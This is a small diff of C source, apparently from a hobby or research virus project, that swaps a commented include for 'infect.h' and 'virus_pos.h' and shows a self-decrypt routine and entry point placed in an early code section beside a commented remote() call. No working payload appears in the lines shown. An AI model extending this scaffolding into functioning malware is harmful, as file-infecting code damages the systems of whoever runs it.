@@ -2,7 +2,8 @@ int main(int ac, char **av) asm ("entry");
 
 #include "lib/lib.h"
 #include "lib/remote.h"
-//#include "lib/infect.c"
+#include "lib/infect.h"
+#include "virus_pos.h"
 
 //extern size_t memaddr;
 extern void _infect();
@@ -44,7 +45,6 @@ void __attribute__((section (".textearly")))decrypt(char *s, uint64_t n, uint32_
 }
 
 //=============================================================
-
 
 int __attribute__((section (".textearly")))main(int ac, char **av){
 	//remote();
